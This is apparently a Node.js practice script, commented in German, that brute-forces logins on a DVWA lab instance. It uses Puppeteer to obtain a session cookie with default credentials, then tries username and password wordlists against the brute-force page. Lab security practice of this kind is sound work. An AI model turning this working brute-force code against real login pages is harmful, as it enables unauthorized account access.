const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const https = require('https');

const DVWA_URL = "http://10.115.2.9:4280/login.php";
const BRUTE_URL = "http://10.115.2.9:4280/vulnerabilities/brute/";
const USERNAME = "admin";
const PASSWORD = "password"; 
const USERNAME_FILE = "usernames.txt";
const PASSWORD_FILE = "password.txt";

// HTTPS-Agent, um unsichere Zertifikate zu ignorieren
const agent = new https.Agent({ rejectUnauthorized: false });

async function getSessionID() {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    console.log("🔑 Logge in DVWA ein...");
    await page.goto(DVWA_URL);
    
    await page.type('input[name="username"]', USERNAME);
    await page.type('input[name="password"]', PASSWORD);
    await page.click('input[type="submit"]');
    await page.waitForNavigation();

    const cookies = await page.cookies();
    const sessionCookie = cookies.find(cookie => cookie.name === 'PHPSESSID');

    await browser.close();

    if (sessionCookie) {
        console.log(`✅ Session-ID erhalten: ${sessionCookie.value}`);
        return sessionCookie.value;
    } else {
        throw new Error("❌ Konnte keine Session-ID finden!");
    }
}

async function tryCredentials(username, password, sessionId) {
    const cookies = `PHPSESSID=${sessionId}; security=low`;
    const params = new URLSearchParams({ username, password, Login: 'Login', Submit: 'Submit' });

    try {
        await axios.get(BRUTE_URL, { headers: { Cookie: cookies }, httpsAgent: agent });

        const response = await axios.get(BRUTE_URL, { params, headers: { Cookie: cookies }, httpsAgent: agent });

        console.log(`🔄 Teste ${username}:${password}`);

        if (response.data.includes("Username and/or password incorrect")) {
            return false;
        } else if (response.data.includes("Welcome to the password protected area")) {
            console.log(`🎉 Richtiges Passwort gefunden!  USER:${username} / PASS:${password}`);
            return true;
        }
    } catch (error) {
        console.error(`⚠️ Fehler: ${error.message}`);
    }
    return false;
}

async function bruteForce(sessionId) {
    const usernames = fs.readFileSync(USERNAME_FILE, 'utf-8').split('\n').map(line => line.trim());
    const passwords = fs.readFileSync(PASSWORD_FILE, 'utf-8').split('\n').map(line => line.trim());

    console.log(`🚀 Starte Brute-Force-Angriff mit ${usernames.length} Usernames und ${passwords.length} Passwörtern`);

    for (const username of usernames) {
        for (const password of passwords) {
            const success = await tryCredentials(username, password, sessionId);
            if (success) return;
        }
    }

    console.log("❌ Keine gültige Kombination gefunden.");
}

(async () => {
    try {
        const sessionId = await getSessionID();
        await bruteForce(sessionId);
    } catch (error) {
        console.error(`❌ Fehler: ${error.message}`);
    }
})();
